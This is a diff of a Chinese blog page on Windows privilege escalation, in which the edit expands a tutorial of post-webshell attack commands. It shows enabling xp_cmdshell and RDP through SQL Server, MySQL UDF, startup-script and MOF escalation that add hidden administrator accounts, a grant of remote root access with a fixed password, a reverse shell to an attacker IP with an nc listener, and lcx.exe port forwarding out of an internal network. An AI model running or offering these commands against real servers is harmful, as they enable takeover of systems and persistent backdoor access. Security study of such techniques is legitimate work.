@@ -116,7 +116,7 @@
 <meta property="og:site_name" content="fuubar2">
 <meta property="og:description" content="什么是提权？就是权限提升。 主要是渗透过程中，通过各种漏洞提升webshell的权限，从而得到服务器的权限。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-04-18T12:46:35.025Z">
+<meta property="og:updated_time" content="2019-04-20T03:06:04.447Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows提权">
 <meta name="twitter:description" content="什么是提权？就是权限提升。 主要是渗透过程中，通过各种漏洞提升webshell的权限，从而得到服务器的权限。">
@@ -342,12 +342,24 @@
                 
               
 
-              <time title="Created: 2019-04-18 20:42:19 / Modified: 20:46:35" itemprop="dateCreated datePublished" datetime="2019-04-18T20:42:19+08:00">2019-04-18</time>
+              <time title="Created: 2019-04-18 20:42:19" itemprop="dateCreated datePublished" datetime="2019-04-18T20:42:19+08:00">2019-04-18</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-04-20 11:06:04" itemprop="dateModified" datetime="2019-04-20T11:06:04+08:00">2019-04-20</time>
               
             
           </span>
@@ -541,9 +553,9 @@
 <p>sa帐号的获取，去看config.asp，conn.asp，web.config</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 安装cmd_shell组件 </span><br><span class="line">EXEC sp_configure ‘show advanced options’,1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’，1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"># 删除cmd_shell组件 </span><br><span class="line">EXEC sp_configure ‘show advanced options’,1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’，0</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"># 开3389</span><br><span class="line">exec master.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\Terminal Server&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,0;</span><br><span class="line"></span><br><span class="line"># 关3389</span><br><span class="line">exec master.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\Terminal Server&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,1;</span><br></pre></td></tr></table></figure>
 <p>如果不允许外连，可以上传木马去连接</p>
-<h5 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h5><p>UDF提权</p>
+<h5 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h5><p><strong>UDF提权</strong></p>
 <ul>
-<li><p>原理：通过root权限，导出duf.dll到系统目录下，然后通过udf.dll调用执行cmd</p>
+<li><p>原理：通过root权限，导出udf.dll到系统目录下，然后通过udf.dll调用执行cmd</p>
 </li>
 <li><p>获取对方的mysql数据库下的root账号密码：</p>
 <ul>
@@ -554,55 +566,59 @@
 </li>
 <li><p>导出duf.dll</p>
 <ul>
-<li><p>5.1一下导入到C:\Winnt\udf.dll 2000；C:\Windows\udf.dll 2003</p>
+<li><p>5.1以下导入到C:\Winnt\udf.dll 2000；C:\Windows\udf.dll 2003</p>
 </li>
 <li><p>5.1以上版本需要导出到mysql安装目录lib\plugin\</p>
+<p><em>可以通过大马上传</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line"></span><br><span class="line">select cmdshell(‘net user x 123123 /add’);</span><br><span class="line"></span><br><span class="line">select cmdshell(‘net localgroup administrators x /add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell; 删除函数</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
 </ul>
-<p>启动项提权</p>
+<p><strong>启动项提权</strong></p>
+<p>​    也需要mysql的root权限</p>
 <ul>
-<li>拿到root权限</li>
-<li>查看数据库中有什么表 <code>show tables;</code></li>
-<li>在TEST数据库中建立一个新表 <code>create table a (cmd text);</code></li>
-<li>在表中插入内容： <ul>
-<li><code>insert into a values (&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;);</code></li>
-<li><code>insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user 1 1 /add&quot;&quot;,0)&quot;);</code></li>
-<li><code>insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators 1 /add&quot;&quot;,0)&quot;);</code></li>
-<li>这三条命令会建立一个VBS的脚本程序</li>
-</ul>
+<li><p>拿到root权限</p>
 </li>
-<li>查看表a内容 ·<code>select * from a</code></li>
-<li>表a中确定是插入的三条数据后，输出表为一个VBS的脚本文件 `select * from a into outfile “c://docume~1//administrator//开始菜单//程序//启动//a.vbs”；</li>
-<li>重启</li>
+<li><p>查看数据库中有什么表 <code>show tables;</code></p>
+</li>
+<li><p>在TEST数据库中建立一个新表 <code>create table a (cmd text);</code></p>
+</li>
+<li><p>在表中插入内容： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 建立一个VBS的脚本程序</span><br><span class="line">insert into a values (&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;);</span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user 1 1 /add&quot;&quot;,0)&quot;);</span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators 1 /add&quot;&quot;,0)&quot;);</span><br><span class="line"></span><br><span class="line"># 查看表a内容 </span><br><span class="line">select * from a`</span><br><span class="line"></span><br><span class="line"># 把写入的内容导出到启动项</span><br><span class="line">select * from a into outfile “c://docume~1//administrator//开始菜单//程序//启动//a.vbs”；</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重启</p>
+</li>
 </ul>
-<p>MOF提权</p>
+<p><strong>MOF提权</strong></p>
 <ul>
-<li>第一种方法： <ul>
-<li>上传mof.php。输入相关信息，执行命令，完成提权</li>
-</ul>
-</li>
-<li>第二种方法： <ul>
-<li>上传文件x.mof</li>
-<li>使用select命令导出到正确位置 <code>select load_file(C:/wmpub/nullevt.mof) into dumpfile &quot;C:/windows/system32/wbem/mof/nullevt.mof&quot;；</code></li>
-<li>允许外部地址使用root用户连接的sql语句 <code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;kdm001&#39; with grant option;</code></li>
-</ul>
-</li>
-</ul>
-<p>反弹端口提权</p>
+<li><p>法一： </p>
 <ul>
-<li>利用mysql客户端工具连接mysql服务器。然后执行下面的操作： <ul>
-<li><code>mysql.exe -h ip -uroot -p</code></li>
-<li>enter password</li>
-<li><code>mysql&gt;\.c:\mysql.txt;</code></li>
-<li><code>mysql&gt;select backshell(&quot;IP&quot;,2010);</code></li>
-<li>本地监听你反弹的端口 <code>nc.exe -vv -i -p 2010</code></li>
-<li>成功后，将获得一个system权限的cmdshell。</li>
+<li><p>上传mof.php</p>
+<p>浏览器端访问该文件，输入相关信息，执行命令，完成提权</p>
+</li>
+</ul>
+</li>
+<li><p>法二： </p>
+<ul>
+<li><p>上传文件x.mof</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 使用select命令导出到正确位置</span><br><span class="line">select load_file(C:/wmpub/nullevt.mof) into dumpfile &quot;C:/windows/system32/wbem/mof/nullevt.mof&quot;；</span><br><span class="line"></span><br><span class="line"># 允许外部地址使用root连接</span><br><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;kdm001&apos; with grant option;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
 </ul>
+<p><strong>反弹端口提权</strong></p>
+<p>​    让服务器去连接黑客的端口，比如80，然后侦听这个端口；当有防火墙的时候，可以使用反弹。</p>
+<ul>
+<li><p>利用mysql客户端工具连接mysql服务器。然后执行下面的操作： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -h ip -uroot -p</span><br><span class="line"># 输入密码</span><br><span class="line">mysql&gt;\.c:\mysql.txt;</span><br><span class="line"># IP填写外网地址</span><br><span class="line">mysql&gt;select backshell(&quot;IP&quot;,2010); </span><br><span class="line"></span><br><span class="line"># 本地监侦听反弹的端口</span><br><span class="line">nc.exe -l -p 2010</span><br><span class="line"># 成功后，将获得一个system权限的cmdshell</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><strong>内网端口转发</strong></p>
+<p>假设内网有3台主机ABC，地址分别为192.168.0.100-102，与之相连的路由器地址为192.168.0.5。</p>
+<p>外网主机(我)想访问内网主机，直接通过192.168.0.100是访问不到的。那该怎么访问呢，路由器端做有端口映射，比如可以通过192.168.0.5:99来访问192.168.0.100，这样就成功访问到了内网主机。</p>
+<p>但是问题来了，如果我想访问A的3389来连接远程桌面，上面的办法就不行了。这就要用到端口转发，就是把A的3389端口转发到外网主机(我)的某一个端口，比如1111，然后对外网主机的1111端口侦听，再用远程桌面访问相应端口就可以了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 让内网主机端口转发，首先要上传lcx.exe</span><br><span class="line"># 内网主机输入命令，把本机的3389转发到外部的1111上</span><br><span class="line">lcx.exe 外网ip 外网端口 内网ip 内网端口</span><br><span class="line">lcx.exe 200.1.1.1 1111 192.168.1.101 3389</span><br><span class="line"></span><br><span class="line"># 外网主机输入命令，去侦听</span><br><span class="line">lcx.exe -listen 1111 1311</span><br><span class="line"># 然后可以连接本机的1311端口来连接远程桌面</span><br></pre></td></tr></table></figure>
 <p>当然还有很多其他乱七八糟的方法.</p>
 
       
@@ -626,7 +642,7 @@
   <p><span>本文标题:</span><a href="/2019/04/18/Windows提权/">Windows提权</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 fuubar 的个人博客">fuubar</a></p>
   <p><span>发布时间:</span>2019年04月18日 - 20:04</p>
-  <p><span>最后更新:</span>2019年04月18日 - 20:04</p>
+  <p><span>最后更新:</span>2019年04月20日 - 11:04</p>
   <p><span>原始链接:</span><a href="/2019/04/18/Windows提权/" title="Windows提权">https://bookchi.github.io/2019/04/18/Windows提权/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://bookchi.github.io/2019/04/18/Windows提权/"  aria-label="复制成功！"></i></span>
   </p>
@@ -681,6 +697,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/21/Linux提权/" rel="prev" title="Linux提权">
+                Linux提权 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -750,7 +770,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-count">18</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
